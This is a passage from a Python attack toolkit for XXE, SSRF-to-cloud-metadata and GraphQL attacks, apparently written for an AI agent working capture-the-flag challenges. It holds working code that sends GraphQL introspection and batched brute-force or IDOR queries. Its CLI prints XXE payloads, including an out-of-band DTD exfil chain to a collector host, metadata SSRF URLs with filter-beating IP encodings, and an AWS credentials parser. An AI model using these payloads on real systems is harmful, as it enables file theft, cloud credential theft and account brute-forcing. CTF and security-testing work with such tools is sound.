            "requests": sent[0], "tried": tried}


# =====================================================================================
#  (3) GraphQL -- introspection, batching, and confirmed probes
# =====================================================================================

# The standard full introspection query (used by GraphiQL / Apollo). Reading the schema is the first
# move against a GraphQL endpoint; many CTF apps leave it on.
INTROSPECTION_QUERY = """
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { ...FullType }
    directives { name description locations args { ...InputValue } }
  }
}
fragment FullType on __Type {
  kind name description
  fields(includeDeprecated: true) {
    name description
    args { ...InputValue }
    type { ...TypeRef }
    isDeprecated deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }
  possibleTypes { ...TypeRef }
}
fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue }
fragment TypeRef on __Type {
  kind name
  ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } }
}
""".strip()

# A terse fallback when the full query is rejected (some servers cap query depth/cost).
INTROSPECTION_QUERY_SHORT = ("{__schema{queryType{name}mutationType{name}"
                             "types{name kind fields{name args{name}}}}}")


def introspection_body(short=False):
    """The JSON request body for an introspection query (a string). POST it with
    Content-Type: application/json."""
    return json.dumps({"query": INTROSPECTION_QUERY_SHORT if short else INTROSPECTION_QUERY})


def batch_array_body(queries):
    """A GraphQL array-batch body: a JSON array of {"query": ...[, "variables": ...]} objects. `queries`
    is a list of query strings or of (query, variables) pairs. A string only; the agent sends it. Array
    batching lets many operations ride one request -- useful for an aliased/brute oracle the agent
    drives, never auto-fired here."""
    out = []
    try:
        iterator = iter(queries)
    except TypeError as exc:
        raise WebXXESSRFError("queries must be an iterable of query specs") from exc
    for q in iterator:
        if isinstance(q, (tuple, list)):
            out.append({"query": q[0], "variables": q[1]})
        else:
            out.append({"query": q})
    return json.dumps(out)


def alias_batch_query(field, arg_name, values, selection="{__typename}", *, alias_prefix="a"):
    """A single GraphQL document with one aliased copy of `field(arg_name: value) selection` per value
    -- in-document batching, so N probes ride ONE request (a login/token oracle, an IDOR sweep the
    agent runs). Returns the query STRING only; values are JSON-encoded. Nothing is sent, and nothing
    destructive is built: `field` is the caller's, and the agent decides whether to fire it."""
    try:
        pairs = list(enumerate(values))
    except TypeError as exc:
        raise WebXXESSRFError("values must be an iterable") from exc
    lines = []
    for i, v in pairs:
        lines.append(f"  {alias_prefix}{i}: {field}({arg_name}: {json.dumps(v)}) {selection}")
    return "query {\n" + "\n".join(lines) + "\n}"


def _graphql_sender(client, path, *, method="POST", send=None, headers=None):
    if send is not None:
        return send
    extra = dict(headers or {})

    def _send(body):
        if method.upper() == "GET":
            sep = "&" if "?" in path else "?"
            return client.request("GET", path + sep + urllib.parse.urlencode({"query": body}))
        h = {"Content-Type": "application/json"}
        h.update(extra)
        return client.request(method.upper(), path, data=body, headers=h)

    return _send


def parse_schema(response_body):
    """Flatten an introspection response into {"query_type", "mutation_type", "types": [names],
    "query_fields": [(name, [arg names])], "mutation_fields": [...]}, or None when the body is not a
    schema (an error, HTML, a reflection). The structural check: data.__schema.types is a non-empty
    list of objects with a `name`."""
    obj = _strict_json(response_body)
    schema = (obj.get("data") or {}).get("__schema") if isinstance(obj, dict) else None
    if not isinstance(schema, dict):
        return None
    types = schema.get("types")
    if not isinstance(types, list) or not types or not all(
            isinstance(t, dict) and "name" in t for t in types):
        return None
    by_name = {t.get("name"): t for t in types}

    def root_fields(root_key):
        root = schema.get(root_key) or {}
        rt = by_name.get(root.get("name")) if isinstance(root, dict) else None
        out = []
        for f in (rt or {}).get("fields") or []:
            if isinstance(f, dict) and f.get("name"):
                out.append((f["name"], [a.get("name") for a in (f.get("args") or [])
                                        if isinstance(a, dict)]))
        return out

    return {
        "query_type": (schema.get("queryType") or {}).get("name"),
        "mutation_type": (schema.get("mutationType") or {}).get("name"),
        "types": [t.get("name") for t in types if not str(t.get("name", "")).startswith("__")],
        "query_fields": root_fields("queryType"),
        "mutation_fields": root_fields("mutationType"),
    }


def probe_introspection(client=None, path="/graphql", *, method="POST", send=None, headers=None,
                        max_requests=4, gap=0.0):
    """Confirm GraphQL introspection is enabled on the target and return the schema. Sends the full
    query, then the short query, then a GET fallback. Returns:

        {"enabled": bool, "schema": {...}|None, "status": int, "body": ..., "flag": flag|None,
         "proof": proof|None, "requests": n, "tried": [(how, status, enabled)]}

    `enabled` is True ONLY when the response parses as a real schema (parse_schema: data.__schema.types
    is a non-empty list of named types) -- an error or a reflected query is not enabled. `flag`/`proof`
    are the single flag/judged proof the schema response carries (rare, but a resolver may leak one); a
    schema is a finding, never a submitted answer."""
    sender = _graphql_sender(client, path, method=method, send=send, headers=headers)
    get_sender = _graphql_sender(client, path, method="GET", send=None, headers=headers) \
        if send is None else send
    sent = [0]
    tried = []
    attempts = [("full", sender, introspection_body(False)),
                ("short", sender, introspection_body(True)),
                ("get", get_sender, INTROSPECTION_QUERY_SHORT)]
    last = None
    for how, fn, body in attempts:
        if sent[0] >= max_requests:
            break
        if sent[0] and gap:
            time.sleep(gap)
        sent[0] += 1
        r = fn(body)
        last = r
        schema = parse_schema(r.get("body"))
        tried.append((how, r.get("status"), bool(schema)))
        if schema:
            return {"enabled": True, "schema": schema, "status": r.get("status"),
                    "body": r.get("body"), "flag": flag_from_exploit(r.get("body")),
                    "proof": proof_from_exploit(r.get("body")),
                    "requests": sent[0], "tried": tried}
    return {"enabled": False, "schema": None, "status": (last or {}).get("status"),
            "body": (last or {}).get("body"), "flag": None, "proof": None,
            "requests": sent[0], "tried": tried}


def confirm_batching(client=None, path="/graphql", *, method="POST", send=None, headers=None):
    """Confirm the endpoint runs ARRAY batches, by sending a benign two-element batch ({__typename}
    twice) and checking the response is a JSON ARRAY of two objects. Returns {"supported": bool,
    "length": int|None, "status": int, "requests": 1}. Structural, not a guess; one request. Array
    batching enables an aliased/brute oracle inside a single rate-limited request -- the agent then
    builds it with alias_batch_query / batch_array_body and decides whether to fire it."""
    sender = _graphql_sender(client, path, method=method, send=send, headers=headers)
    r = sender(batch_array_body(["{__typename}", "{__typename}"]))
    obj = _strict_json(r.get("body"))
    supported = isinstance(obj, list) and len(obj) == 2 and all(isinstance(x, dict) for x in obj)
    return {"supported": bool(supported), "length": (len(obj) if isinstance(obj, list) else None),
            "status": r.get("status"), "requests": 1}


# =====================================================================================
#  CLI (offline only -- nothing here contacts a target)
# =====================================================================================

def _cli_xxe(a):
    if a.oob:
        dtd, payload = xxe_oob_dtd(a.base, a.token, a.file, php=a.php)
        print("# DTD (serve at <base>/f/<token>.dtd; use tools/oob.py to serve and collect):")
        print(dtd.rstrip())
        print("# XML payload (send as the body the target parses):")
        print(payload)
        return 0
    print(f"# in-band XXE variants for {a.file} (a hit is confirmed by the file's content signature):")
    for label, xml in xxe_file_payloads(a.file, entity=a.entity):
        print(f"## {label}")
        print(xml)
    return 0


def _cli_ssrf(a):
    print(f"# cloud instance-metadata endpoints (feed each URL as the fetch parameter's VALUE):")
    for cloud, url, hdrs, note in metadata_urls(a.ip, encodings=True):
        h = ("  inner-header " + json.dumps(hdrs)) if hdrs else ""
        print(f"{cloud:18s} {url}{h}")
    print(f"# IP spellings of {a.ip} (beat a naive string filter):")
    for host in ip_encodings(a.ip):
        print("  " + host)
    return 0


def _cli_imdsv2(a):
    for step in imdsv2_steps(a.param):
        print(json.dumps(step))
    return 0


def _cli_graphql(a):
    print("# introspection body (POST application/json):")
    print(introspection_body(short=a.short))
    print("# array-batch body (two operations in one request):")
    print(batch_array_body(["{__typename}", "query{__typename}"]))
    print("# aliased in-document batch (one request, N probes):")
    print(alias_batch_query("user", "id", [1, 2, 3], selection="{id name}"))
    return 0


def _cli_selftest(a):
    """Offline self-checks of the payload shapes and the never-a-guess flag/proof rules. No network."""
    ok = []

    def c(label, cond):
        ok.append(bool(cond))
        print(f"{'ok  ' if cond else 'FAIL'} {label}")

    import xml.dom.minidom as _dom
    for label, xml in xxe_file_payloads("/etc/passwd"):
        try:
            _dom.parseString(xml)
            well = True
        except Exception:
            well = (label == "utf16")   # a UTF-16-declared doc given as str may not parse; the bytes do
        c(f"xxe variant {label} is well-formed XML", well)
    dtd, payload = xxe_oob_dtd("http://10.0.0.5:8000", "o0123456789ab", "/etc/passwd")
    c("oob dtd has the parameter-entity exfil chain", "% file SYSTEM" in dtd and "%exfil;" in dtd)
    c("oob payload loads the external dtd", "/f/o0123456789ab.dtd" in payload)
    enc = ip_encodings("169.254.169.254")
    c("ip encodings include decimal 2852039166", "2852039166" in enc)
    c("ip encodings include hex 0xa9fea9fe", "0xa9fea9fe" in enc)
    c("ip encodings include an ipv6-mapped form", any(x.startswith("[::ffff:") for x in enc))
    # metadata signatures: a real AWS creds doc matches, a URL reflection does not.
    creds = (b'{"Code":"Success","AccessKeyId":"ASIAEXAMPLE","SecretAccessKey":"abc",'
             b'"Token":"zzz","Type":"AWS-HMAC"}')
    sig = metadata_signature(creds)
    c("aws credentials body is recognised", sig and sig[0] == "aws" and "aws_credentials" in sig[1])
    c("parse_aws_credentials returns the creds", (parse_aws_credentials(creds) or {}).get("AccessKeyId") == "ASIAEXAMPLE")
    c("a URL reflection is not a metadata signature",
      metadata_signature(b"you asked for http://169.254.169.254/latest/meta-data/ (not found)") is None)
    # graphql: a schema parses, an error does not.
    schema_body = json.dumps({"data": {"__schema": {"queryType": {"name": "Query"}, "mutationType": None,
                             "types": [{"name": "Query", "fields": [{"name": "me", "args": []}]},
                                       {"name": "User"}]}}})
    sc = parse_schema(schema_body)
    c("a real schema parses", sc and sc["query_type"] == "Query" and "User" in sc["types"])
    c("a graphql error is not a schema", parse_schema('{"errors":[{"message":"nope"}]}') is None)
    # the never-a-guess flag rule (CSCTF flag spec).
    good = "csctf{xxe_ssrf_read}"
    c("a single flag from an exploit body is returned",
      flag_from_exploit("leaked " + good, ["landing page"]) == good)
    c("a flag on a plain page is NOT claimed (payoff-not-plain)",
      flag_from_exploit("x " + good, ["home " + good]) is None)
    c("two distinct flags are NOT claimed (one-flag)",
      flag_from_exploit(good + " " + "flag{other}", []) is None)
    c("a flag-format value is returned",
      flag_from_exploit(good, []) == good and is_flag(good))
    c("a non-flag string is never returned",
      flag_from_exploit("leaked nothing", []) is None)
    # the never-guess proof rule (the Huntress spec carried beside the flag spec).
    proof = "proof_" + "0123456789ab" + "4" + "def" + "8" + "0123456789abcde"
    c("a single judged proof from an exploit body is returned",
      proof_from_exploit("leaked " + proof, ["landing page"]) == proof)
    c("a proof on a plain page is NOT claimed (payoff-not-plain)",
      proof_from_exploit("x " + proof, ["home " + proof]) is None)
    c("two proof-like values are NOT claimed (one-proof)",
      proof_from_exploit(proof + " " + ("proof_" + "ff"*16), []) is None)
    non_v4 = "proof_" + "f" * 32
    c("a lowercase proof_32hex is returned even when its UUID nibbles are not v4",
      proof_from_exploit(non_v4, []) == non_v4 and not PROOF_FORMAT.fullmatch(non_v4))
    upper = proof.upper()
    c("an uppercase proof candidate is retained exactly but never auto-returned",
      proofs_seen("leaked " + upper) == {upper} and proof_from_exploit("leaked " + upper, []) is None)
    print("ok" if all(ok) else f"{ok.count(False)} FAILED")
    return 0 if all(ok) else 1


def main(argv=None):
    p = argparse.ArgumentParser(prog="web_xxe_ssrf.py",
                                description="XXE / SSRF-to-metadata / GraphQL hand tool (offline CLI)")
    sub = p.add_subparsers(dest="cmd", required=True)
    s = sub.add_parser("xxe"); s.add_argument("--file", required=True); s.add_argument("--php", action="store_true")
    s.add_argument("--entity", default="xxe"); s.add_argument("--oob", action="store_true")
    s.add_argument("--base", default="http://COLLECTOR"); s.add_argument("--token", default="o000000000000")
    s = sub.add_parser("xxe-oob"); s.add_argument("--base", required=True); s.add_argument("--token", required=True)
    s.add_argument("--file", required=True); s.add_argument("--php", action="store_true")
    s.add_argument("--entity", default="xxe"); s.set_defaults(oob=True)
    s = sub.add_parser("ssrf"); s.add_argument("--ip", default=METADATA_IP)
    s = sub.add_parser("imdsv2"); s.add_argument("param")
    s = sub.add_parser("graphql"); s.add_argument("--short", action="store_true")
    sub.add_parser("selftest")
    try:
        a = p.parse_args(argv)
    except SystemExit as exc:
        return exc.code if isinstance(exc.code, int) else 2
    if a.cmd in ("xxe", "xxe-oob"):
        return _cli_xxe(a)
    return {"ssrf": _cli_ssrf, "imdsv2": _cli_imdsv2, "graphql": _cli_graphql,
            "selftest": _cli_selftest}[a.cmd](a)


if __name__ == "__main__":
    sys.exit(main())
